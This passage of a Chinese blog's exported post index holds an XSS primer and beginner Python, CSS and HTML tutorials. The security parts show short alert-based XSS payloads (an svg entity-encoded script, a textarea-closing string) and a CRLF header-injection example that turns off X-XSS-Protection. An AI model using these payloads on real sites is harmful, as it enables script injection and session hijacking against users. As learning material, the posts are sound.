标签，其有一个特性就是可以执行HTML实体代码。用法是&lt;svg&gt;&amp;#数字;所以构造payload:&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;","categories":[],"tags":[]},{"title":"XSS知识简单学习","slug":"xss学习","date":"2019-08-16T08:21:01.000Z","updated":"2019-08-20T12:40:31.000Z","comments":true,"path":"2019/08/16/xss学习/","link":"","permalink":"https://chumen77.github.io/2019/08/16/xss学习/","excerpt":"","text":"XSS知识简单学习一:Xss简介XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。 ##二：ajax简介ajax其实就是异步JavaScript和xml，其最大优势在于可以实现异步访问。为什么要用AJAX，首先它够隐秘，也就是所谓的“无刷新”，其次，它能更有效地迅速处理各种复杂多变的数据。其可以实现异步更新和跨域。 三：xss漏洞分类存储XSS存储XSS,会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。也就是提交JS攻击代码存储到数据库然后再输出。 用户输入的地方最容易滋生XSS，譬如留言、评论等表单，一个的留言本，因为没有对用户输入的变量作出合适的过滤，导致一个XSS的产生。留言率先传递给管理员，当作javascript劫持，我们就可以利用管理员的权限做任何事情。当内容通过审核，发布到网站，此时所有的web浏览用户都有可能受到XSS，我们能获得更多的会话劫持。 反射型XSS攻击反射型XSS攻击也是非持久型XSS攻击，其是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的，其是经过服务器的。 其需要黑客进行诱骗使用户访问这个带有xss攻击的链接后，便被JavaScript劫持，收到攻击。 Dom-xss通过URL传入参数所触发，其不与服务器进行通信，但是我们的js攻击代码可以被执行，这是需要分析页面源码然后进行利用，是存在客户端页面的脚本自身中。 四：X-XSS-Protection是浏览器对xxs防护的一个策略，这个可以通过抓包软件，修改头来进行绕过。筒単一句活:header(&quot;X-XSS-Protection: 0&quot;);告泝浏览器禁用XSS保枦 header(&quot;X-XSS-Protection: 1&quot;);告泝浏览器幵宕XSS保枦 五：CRLF响应头注入Location: http://****%0d%0aX-XSS-Protection: 0就是相当于Location: http://**** XSS-Protection: 0这就是一个注入，又添加了一个响应头。但是这种漏洞在php版本&gt;5.1时候是不行的，因为其不允许在HTTP头中出现两个属性。应用场景： php&lt;5.1 碰到了服务器开启xss拦截 六：修补xss漏洞（简单）过滤例如 &gt; &lt; Script等等字眼 转义利用php函数 htmlentities()把字符转换为HTML实体 七：闭合xss当你的js代码被浏览器直接显示出来后，考虑是否是其源码里对你的js代码做了textarea标签处理，然后就需要我们去闭合这个textarea标签，比较通用的就是&#39;&quot;&gt;&lt;/textarea&gt;+js代码 即可。","categories":[],"tags":[]},{"title":"简易解决python2.X与python3.x共存问题","slug":"简易解决python2.X与python3.x共存问题","date":"2019-04-02T15:05:47.000Z","updated":"2019-04-29T14:56:51.000Z","comments":true,"path":"2019/04/02/简易解决python2.X与python3.x共存问题/","link":"","permalink":"https://chumen77.github.io/2019/04/02/简易解决python2.X与python3.x共存问题/","excerpt":"","text":"简易解决python2.X与python3.x共存问题python3.x不兼容Python2.x，语法有许多不同，但很多工具还是需要2.x版本，自己又是初学者，只是跑跑别人的脚本，不会改语法冲突。。。。下面说解决办法。 安装模块Python目前还是需要分开安装 1py -2 -m pip install xxxx 1py -3 -m pip install xxxx 运行脚本分别用py2.x py3.x运行一个1.py的脚本： 1py -2 1.py 1py -3 1.py 或者在1.py的文件代码头加上#! python3 #! python2看个人的情况。 这样就直接输入： 1py 1.py 这只是解决了简单的安装模块和运行脚本的问题。","categories":[],"tags":[]},{"title":"css学习","slug":"css学习","date":"2019-03-30T14:48:12.000Z","updated":"2019-08-04T04:09:51.000Z","comments":true,"path":"2019/03/30/css学习/","link":"","permalink":"https://chumen77.github.io/2019/03/30/css学习/","excerpt":"","text":"CSS如何使用CSSCSS可以通过以下方式添加到HTML中: 内联样式- 在HTML元素中使用”style” 属性 (不推荐使用)； 内部样式表 -在HTML文档头部 &lt;head&gt; 区域使用&lt;style&gt;元素 来包含CSS。 外部引用 - 使用外部 CSS 文件(==推荐使用)== 内联样式应用到个别元素时，就可以使用内联样式。 1&lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;苹果&lt;/div&gt; 内部样式表当单个文件需要特别样式时，就可以使用内部样式表。你可以在&lt;head&gt; 部分通过 &lt;style&gt;标签定义内部样式表:。也推荐这样使用便于更改全局。 12345678910&lt;head&gt;&lt;style&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt;&lt;/head&gt; 注：在头文件写的时候 style还是个开闭标签。 外部样式表用&lt;link&gt;当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。 123&lt;head&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\"&gt; &lt;/head&gt; 其中“rel=”stylesheet” type=”text/css””这是固定的,”mystyle.css”这是css的地址； 练习：1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;css三种引入方式&lt;/title&gt; &lt;!-- &lt;style&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt; --&gt; &lt;link rel=\"stylesheet\" href=\"1.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;苹果&lt;/div&gt; --&gt; &lt;div&gt; 苹果1&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 123456div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;!-- 1.css --&gt; 效果： CSS 语法 CSS 语法CSS 语法规则由两个主要的部分构成：选择器，以及一条或多条声明: 选择器通常是您需要改变样式的 HTML 元素。 每条声明由一个属性和一个值组成。 属性是您希望设置的样式属性。每个属性有一个值。属性和值被冒号分开。 CSS声明总是以分号(;)结束，声明组以大括号({})括起来 例：h1{ color:blue; font-size :12px;} 其中h1 为选择器 color 是属性 blue是值。 CSS 注释：CSS注释以 “/*“ 开始, 以 “*/“ 结束。 颜色：颜色属性被用来设置文字的颜色。 颜色是通过CSS最经常的指定： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) 颜色的名称 - 如: red 常用的：rgb：：r是红色，g是绿色，b是蓝色。 123body &#123;color:red;&#125; h1 &#123;color:#00ff00;&#125; /* 可以写成 #0f0 */h2 &#123;color:rgb(255,0,0);&#125; /* 0-255 */ 是其颜色深浅 ==注 - 所有浏览器都不支持颜色的rgb（）属性，因此建议不要使用它。== CSS选择器基本选择器： id 选择器：可以为标有特定 id 的 HTML 元素指定特定的样式。HTML元素以id属性来设置id选择器,CSS 中 id 选择器以 “#” 来定义。（==ID属性不要以数字开头==） class 选择器：class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。 例：&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt; 。class 选择器在HTML中以class属性表示, 在 CSS 中，类选择器以一个点“.”号显示 *通配符：全部标签属性的都会有效果。 标签 div：div标签 的会有效果。 练习： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;css选择器&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"1.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;div111 &lt;div&gt;div222&lt;/div&gt; &lt;p id=\"txt\"&gt;the way i am&lt;/p&gt; &lt;p class=\"txt1 txt2\"&gt;song&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; css： 123456789101112131415div&#123; color: red; width: 100px; height: 100px; background: yellow &#125;#txt&#123; color: #1f1;&#125;.txt1 &#123; font-size: 10px;&#125;.txt2 &#123; color: #ff2;&#125; 效果： CSS原理优先原则优先原则：后解析的内容，会覆盖掉原来解析的内容。 1:同一个选择器:从上往下执行。 例： 1234div&#123; color: red; color: green; &#125;/*最终是为绿色*/ 2:同一类型的选择器：从上往下执行 例： 123456div&#123; background: yellow;&#125;div&#123; background: red;&#125;/*最终是为红色*/ 123456.bg1&#123; background: yellow;&#125;.bg2&#123; background: blue;&#125;/*最终是为蓝色*/ &lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt; 在HTML中，bg1 与bg2的位置交换也不管css解析的事情，所以交换后还是blue。 3：不同类型的选择器：看优先级 先解析低级的在解析高级的：* &lt; div &lt; class &lt; id 123456div&#123; color: red；&#125;.bg1&#123; color: yellow;&#125; /*最终是为黄色*/ 4：多重样式优先级 样式可以规定在单个的 HTML 元素中，在 HTML 页的头元素中，或在一个外部的 CSS 文件中。甚至可以在同一个 HTML 文档内部引用多个外部样式表。 一般情况下，优先级如下： 内联样式 &gt; 内部样式 &gt;外部样式 ==（谁优先级越高越最后解析）== 对于全部都是 当加上!important 这个选择器的内容就会最后进行。 继承原则==对于嵌套标签，子级继承父级。== 文字 文本 样式可以继承，其他的不能。 块级元素 没有设置的时候，会继承父级的宽，而高度则是看其内容长短。 CSS组成选择器分组选择器直接上代码了： 123456789div&#123; background: green; color: red;&#125;p&#123; background: green; color: red; font-size: 50px;&#125; 1234567div,p&#123; background: green; color: red;&#125;p&#123; font-size: 50px;&#125; 把div 与 p 里面相同的部分放到一个里面就行了。 嵌套选择器12345div p&#123; background: green; color: red; font-size: 50px;&#125; 12345678910111213&lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt; 只要在其父或父的以上级有div，那这个p里的东西就能生效。 效果： 子选择器这个和以上很类似，区别在只在其父为div时，才能生效。 12345div&gt;p&#123; background: green; color: red; font-size: 50px;&#125; 类比以上就是只有p2有css效果 同级选择器12345div+p&#123; background: green; color: red; font-size: 50px;&#125; 在平级的p才可以生效，对比以上，也就是p1是有css效果。 属性选择器12345p[title=cc]&#123; background: green; color: red; font-size: 50px;&#125; 12345678910111213&lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p title=\"cc 1\"&gt;p1&lt;/p&gt;&lt;/body&gt; 基本标签==+== [属性=值]：p3出现css效果。 [属性~=值]：p1 p3出现css效果。 注意：代码中cc 1需要空格隔开，不隔没有效果。 [属性^=值]：开头有cc的字符就行cc1. p1 p3 出现cc效果。 [属性$=值]：类比^= 是结束。 伪元素选择器每个我自己写出来的元素都会有伪元素。、 例： 123456789&lt;p title=\"cc\"&gt; &lt;!--&lt;before&gt; --&gt; ppp &lt;!--&lt;after&gt; --&gt; &lt;/p&gt; 直接上代码： 1234567p::before&#123; content: \"before\" &#125;p::after&#123; content: \"after\"&#125; 效果： 块元素： 第一个字母：first-letter 第一行：first-line 1234p::first-letter&#123; color: red; font-size: 100px;&#125; 这些写就是会是p内内容第一个字符大写。 也可以为 12345&lt;p title=\"cc\"&gt; &lt;first-letter&gt;t &lt;/first-letter&gt; he way i am ; &lt;/p&gt; CSS 背景CSS 背景属性用于定义HTML元素的背景。 背景颜色background-color 属性定义了元素的背景颜色. 页面的背景颜色使用在body的选择器中: body {background-color:red;} 背景图像background-image属性描述了元素的背景图像. 默认情况下，背景图像进行平铺重复显示. body {background-image:url(&#39;1.png&#39;);} 背景图像 - 相关设置 水平或垂直平铺： 12345body&#123;background-image:url('gradient2.png');background-repeat:repeat-x;&#125; 里面repeat-x是x轴，repeat-y是y轴。 不平铺：background-repeat:no-repeat 定位： ​ background-position:50% 0% 这使其在x轴的中心， ​ x： left center right； ​ y: top center bottom； css字体css字体 字体系列：font-family 属性设置文本的字体系列，应该设置几个字体名称作为一种”后备”机制。 例：font-family:&quot;黑体&quot;, &quot;宋体&quot;,&quot;微软黑雅&quot;; 字体样式:font-style:italic;斜体 字体大小：font-size 属性设置文本的大小。font-size:40px; font-weight: 设置其粗细。font-weight: normal lighter blod; 练习： 123456body &#123; font-family: \"黑体\",\"宋体\"; font-style:italic; font-size:80px; font-weight: bold;&#125; /*5.css */ 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;文字-字体&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"5.css\"&gt;&lt;/head&gt;&lt;body&gt; 这是一段字 &lt;br&gt; hello world!&lt;/body&gt;&lt;/html&gt; CSS - 文本文本属性集合 color属性用于设置文本的颜色 direction属性用于设置文本方向。 letter-spacing属性用于在组成单词的字母之间添加或减去空格。 text-indent属性用于缩进段落的文本。 text-align属性用于对齐文档的文本。 text-decoration属性用于下划线，上划线和删除文本。 text-transform属性用于大写文本或将文本转换为大写或小写字母。 white-space属性用于控制文本的流和格式。 text-shadow属性用于设置文本周围的文本阴影。 文本颜色： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) ==不推荐使用太多浏览器不支持== 颜色的名称 - 如: red 123body &#123;color:red;&#125;h1 &#123;color:#00ff00;&#125;h2 &#123;color:rgb(255,0,0);&#125; 文本的对齐方式文本可居中或对齐到左或右,两端对齐. 12345678910.a1&#123; text-align:right;&#125;.a2&#123; text-align:center;&#125;.a3&#123; text-align:left;&#125; 123456&lt;body&gt; &lt;p class=\"a1\"&gt;这是一段字&lt;/p&gt; &lt;br&gt; &lt;p class=\"a2\"&gt;hello world!&lt;/p&gt; &lt;p class=\"a3\"&gt;hhhhaaaa&lt;/p&gt;&lt;/body&gt; 文本修饰装饰文字，值为none（去掉修饰），underline，overline，line-through，blink。 12345678910.a1&#123; text-decoration:overline;&#125;.a2&#123; text-decoration:line-through;&#125;.a3&#123; text-decoration:underline;&#125; 文本缩进文本缩进属性是用来指定文本的第一行的缩进。 p {text-indent:50px;} 文本方向值是ltr或rtl。 123.a&#123; direction:rtl; &#125; 文字就先写到这。 CSS 链接链接样式 a:link - 正常，未访问过的链接 a:visited - 用户已访问过的链接 a:hover - 当用户鼠标放在链接上时 a:active - 链接被点击的那一刻 a:link {color: red;} CSS列表常用的就是 123456ul&#123; list-style-type: none; list-style-type: disc; 实心圆 list-style-type: circle; 空心圆 list-style-type: square; 实心方格&#125; 最常用就是 none 然后换成自己想弄成的图片。 ol 对应就是 lower-alpha upper-alpha lower-roman等等； 作为列表项标记的图像 1234ul&#123; list-style-image: url(&apos;&apos;);&#125;","categories":[],"tags":[]},{"title":"HTML学习","slug":"HTML","date":"2019-03-29T12:04:07.000Z","updated":"2019-10-15T16:05:00.000Z","comments":true,"path":"2019/03/29/HTML/","link":"","permalink":"https://chumen77.github.io/2019/03/29/HTML/","excerpt":"","text":"HTML 学习HTML 基础 HTML标题：是通过 &lt;h1&gt; - &lt;h6&gt; 标签来定义的.；其会因为数字变化而显示的字体大小变化； HTML段落：通过标签&lt;p&gt; 来定义的. HTML链接：通过标签&lt;a&gt;来定义的。 HTML图像：通过标签 &lt;img&gt; 来定义的。 HTML 文本HTML 标题标题（Heading）是通过&lt;h1&gt; - &lt;h6&gt; 标签进行定义的.&lt;h1&gt; 定义最大的标题。 &lt;h6&gt;定义最小的标题。浏览器会自动地在标题的前后添加空行。 标题很重要： 不要仅仅是为了生成粗体或大号的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。 HTML 注释注释： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。 1&lt;!-- 这是一个注释 --&gt; HTML 段落浏览器会自动地在段落的前后添加空行。（&lt;/p&gt;是块级元素） HTML 水平线1：&lt;hr&gt;标签在 HTML 页面中创建水平线。 HTML 文本格式化通常用到&lt;strong&gt;&lt;em&gt;&lt;del&gt;这几个标签。 练习：1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;文本&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;h1&gt;标题1&lt;/h1&gt; &lt;h2&gt;标题2&lt;/h2&gt; &lt;h3&gt;标题3&lt;/h3&gt; &lt;h4&gt;标题4&lt;/h4&gt; &lt;h5&gt;标题5&lt;/h5&gt; &lt;h6&gt;标题6&lt;/h6&gt; --&gt; &lt;!-- &lt;h&gt;标签有大小之分 --&gt; &lt;h2&gt;五花山&lt;/h2&gt; &lt;p&gt;我家住在大山里。你知道这里的山是什么颜色的吗？&lt;/p&gt; &lt;p&gt;春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。&lt;/p&gt; &lt;p&gt;夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。&lt;/p&gt; &lt;p&gt;秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。&lt;/p&gt; &lt;p&gt;秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“&lt;strong&gt;&lt;em&gt; &lt;del&gt;五花山&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;”。&lt;/p&gt; &lt;!-- 几个标签的嵌套 --&gt; &lt;strong&gt;加粗&lt;/strong&gt; &lt;em&gt;斜体&lt;/em&gt; &lt;del&gt;删除文字&lt;/del&gt;&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML 图像 ==HTML 图像-== ： 标签（ &lt;img&gt;）是空标签，意思是说，它只包含属性，并且没有闭合标签。 源属性（&lt;src&gt;）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意绝对路径和相对路径（可以用../来返回 一级目录，返回几级目录就写几个它就行)。 Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。==搜索引擎也是通过此描述来收集图片的==. 高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。 练习： 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;图片&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=\"1.png\" alt=\"chumen的qq图像\" title=\"chumen的qq图像\"&gt;&lt;/body&gt;&lt;/html&gt; 图片的映射目标是为了在一张图片上的某个位置点击后才可以实现某个功能。 这需要用到usemap=&quot;#diyname&quot; 然后用&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;标签来对应。 核心代码：&lt;map name=&quot;1map&quot;&gt; &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot;&gt; &lt;/map&gt; shape是选择的形状，coords是坐标，坐标确定推荐用qq的截图功能那里来确定，比如： 那这个彩色箭头指的位置就是在这个图像的（233,456）位置。 练习： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;图片的映射&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=\"1.png\" alt=\"\" usemap=\"#1map\"&gt; &lt;map name=\"1map\"&gt; &lt;area shape=\"circle\" coords=\"300,255,50\" target=\"_blank\" href=\"http://www.baidu.com\"&gt; &lt;/map&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML 超链接超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 &lt;a&gt;来设置超文本链接。 HTML 链接语法:&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt; ,href 属性描述了链接的目标。 target 属性 :target=&quot;_blank&quot;效果就是在新窗口（空白界面）做出来 。 id 属性:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID: &lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt; 在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”: &lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt; 解释加补充：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（&lt;a href=&quot;# &quot;&gt;），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。 &lt;a name=&quot;end&quot;&gt;&lt;/a&gt; &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt; 做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个 练习：（为了方便阅读，省略了很多的&lt;br&gt;.） 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;超级链接&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;a href=\"http://www.mi.com\" target=\"_blank\"&gt;&lt;img src=\"1.png\"&gt;&lt;/a&gt; &lt;!-- /*书签标记：锚点*/ --&gt; &lt;a href=\"#end\"&gt;end&lt;/a&gt;&lt;br id=\"aa\"&gt;&lt;br&gt;&lt;br id=\"miao\"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a name=\"miao\"&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;a name=\"end\"&gt;&lt;/a&gt; &lt;a href=\"#miao\"&gt;miao&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; HTML 列表 HTML无序列表：&lt;ul&gt;与 &lt;li&gt;其点的样式(圆圈，圆心，正方形）用css来控制&lt;ul style=&quot;list-style-type:circle&quot;&gt; HTML 有序列表 &lt;ol&gt;与&lt;li&gt; 用法和无序相似，且有序与无序之间可以互相嵌套，嵌套过程中点的形状也会自动变化。 HTML 自定义列表：这个是比较常用的，自定义列表以&lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt;开始。其不仅仅是一列项目，而是项目及其注释的组合。 123456&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt; &lt;!-- 列表标题 --&gt;&lt;dd&gt;- black hot drink&lt;/dd&gt; &lt;!-- 其内容 --&gt;&lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt;&lt;/dl&gt; 练习： 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;ul style=\"list-style-type:circle\"&gt; &lt;li&gt;无序列表1&lt;/li&gt; &lt;li&gt;无序列表2&lt;/li&gt; &lt;li&gt;无序列表3&lt;/li&gt; &lt;li&gt;无序列表4&lt;/li&gt; &lt;/ul&gt; &lt;ol&gt; &lt;li&gt;有序列表1&lt;/li&gt; &lt;li&gt;有序列表2&lt;/li&gt; &lt;li&gt;有序列表3&lt;/li&gt; &lt;li&gt;有序列表4&lt;/li&gt; &lt;/ol&gt; &lt;dl&gt; &lt;dt&gt;标题1&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;dt&gt;标题2&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML表格 HTML 表格：表格由 &lt;table&gt;标签来定义。每个表格均有若干==行==（由 &lt;tr&gt; 标签定义），每行被分割为若干==单元格==（由 &lt;td&gt; 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。这个有利于多样化，在分清栏目后在td里放内容就ok。 HTML 边框属性:&lt;table border=&quot;1&quot;&gt;会出现表框。 HTML 表格表头:表格的表头使用 &lt;th&gt; 标签进行定义。&lt;th&gt;标签与&lt;td&gt;标签用法相似只是显示的效果不同，会有粗体居中的效果； HTML表格合并：用 colspan： 横向行 rowspan ：竖纵行。 HTML表格单元格边距的设置：类似 设置边框 直接在table标签里放入cellpadding=“自定义的数字”，就设置好了。 练习： 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;表格&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;部门&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;工资&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=\"3\"&gt;开发组&lt;/td&gt; &lt;td&gt;小明&lt;/td&gt; &lt;td&gt;男&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;小白&lt;/td&gt; &lt;td&gt;女&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=\"2\"&gt;工资合计&lt;/td&gt; &lt;td&gt;2w&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML 表单表单是一个包含表单元素的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。 `input元素 ` HTML 表单 - 输入元素输入标签&lt;input&gt;。 文本域文本域通过&lt;input type=&quot;text&quot;&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。 `First name: Last name: ` 在大多数浏览器中，文本域的缺省宽度是20个字符。 密码字段&lt;input type=&quot;password&quot;&gt; 来定义 123&lt;form&gt;Password: &lt;input type=\"password\" name=\"pwd\"&gt;&lt;/form&gt; 单选按钮&lt;input type=&quot;radio&quot;&gt; 标签定义了表单单选框选项。 12345&lt;form&gt;&lt;input type=\"radio\" name=\"sex\" value=\"male\"&gt;Male&lt;br&gt;&lt;input type=\"radio\" name=\"sex\"value=\"female\"&gt;Female&lt;/form&gt; Name 是可以进行==分组==。想要有效果 value也少不了。 复选框&lt;input type=&quot;checkbox&quot;&gt;定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。 1234&lt;form&gt;&lt;input type=\"checkbox\" name=\"vehicle\" value=\"Bike\"&gt;I have a bike&lt;br&gt;&lt;input type=\"checkbox\" name=\"vehicle\" value=\"Car\"&gt;I have a car &lt;/form&gt; 类似单选三者缺一不可。 提交按钮&lt;input type=&quot;submit&quot;&gt;定义了提交按钮. 1234&lt;form name=\"input\" action=\"\" method=\"\"&gt;Username: &lt;input type=\"text\" name=\"user\"&gt;&lt;input type=\"submit\" value=\"Submit\"&gt;&lt;/form&gt; ==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。 name：为控件命名，以备后台程序 ASP、PHP 使用== 练习：123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"\"&gt; &lt;!-- action 中值为提交的网页 --&gt;&lt;!-- 默认为get --&gt; admin&lt;input type=\"text\" name=\"user\"&gt; password&lt;input type=\"password\" name=\"password\"&gt; &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"male\"&gt;男 &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"female\"&gt;女 &lt;input type=\"radio\" name=\"sex\"&gt;中性&lt;!-- name中值一样那么其分组就一样 --&gt; &lt;!-- &lt;input type=\"radio\" name=\"sex\"&gt;男 &lt;input type=\"radio\" name=\"sex\"&gt;女 &lt;input type=\"radio\" name=\"sex\"&gt;中性 --&gt; &lt;br&gt; &lt;!-- 兴趣复选框 --&gt; &lt;input type=\"checkbox\" name=\"xq\" value=\"kanshu\"&gt; 看书 &lt;input type=\"checkbox\" name=\"xq\" value=\"xuexi\"&gt; 学习 &lt;input type=\"checkbox\" name=\"xq\" value=\"music\"&gt; 听歌 